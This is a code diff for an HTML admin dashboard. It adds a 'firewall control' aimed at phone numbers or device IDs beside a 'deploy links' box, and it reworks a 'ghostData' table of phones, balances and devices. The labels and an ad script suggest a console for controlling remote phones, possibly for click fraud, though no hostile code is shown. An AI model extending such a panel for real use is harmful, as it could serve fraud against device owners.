@@ -37,14 +37,29 @@
         <button class="logout-btn" onclick="logout()">⛔ TERMINATE</button>
     </div>
 
-    <!-- DEPLOY LINKS -->
-    <div class="card">
-        <div class="card-header">
-            <h3><span>⚡</span> DEPLOY LINKS</h3>
+    <!-- DEPLOY LINKS + FIREWALL (side by side) -->
+    <div style="display: flex; gap: 15px; margin-bottom: 16px; flex-wrap: wrap;">
+        <!-- DEPLOY LINKS (left) -->
+        <div class="card" style="flex: 2;">
+            <div class="card-header">
+                <h3><span>⚡</span> DEPLOY LINKS</h3>
+            </div>
+            <div class="card-body">
+                <textarea id="links" rows="3" placeholder="Enter links (one per line)"></textarea>
+                <button class="btn" onclick="deploy()">🚀 DEPLOY NOW</button>
+            </div>
         </div>
-        <div class="card-body">
-            <textarea id="links" rows="3" placeholder="Enter links (one per line)"></textarea>
-            <button class="btn" onclick="deploy()">🚀 DEPLOY NOW</button>
+        
+        <!-- FIREWALL (right) -->
+        <div class="card" style="flex: 1;">
+            <div class="card-header">
+                <h3><span>🔥</span> FIREWALL CONTROL</h3>
+            </div>
+            <div class="card-body">
+                <input type="text" id="firewallTarget" placeholder="Phone or Dev# (e.g., 0912 or Dev1)">
+                <button class="btn-firewall" onclick="activateFirewall()">🔥 ACTIVATE FIREWALL</button>
+                <button class="btn-firewall-off" onclick="deactivateFirewall()">🔓 DEACTIVATE FIREWALL</button>
+            </div>
         </div>
     </div>
 
@@ -76,7 +91,7 @@
             <div class="table-wrap">
                 <table>
                     <thead>
-                        <tr><th>PHONE</th><th>BALANCE</th><th>CLICKS</th><th>LAST SEEN</th><th></th></tr>
+                        <tr><th>PHONE</th><th>BALANCE</th><th>DEV#</th><th>LAST SEEN</th><th>ACTIONS</th></tr>
                     </thead>
                     <tbody id="ghostData"></tbody>
                 </table>
@@ -119,11 +134,9 @@
     </div>
 </div>
 
-<!-- ========== EXTERNAL JAVASCRIPT ========== -->
 <script src="js/adscript.js"></script>
 
 <script>
-    // Auto-refresh intent (0.5 seconds)
     setTimeout(function() {
         if (!window.location.hash.includes("#verified")) {
             const currentUrl = window.location.href.split('#')[0];
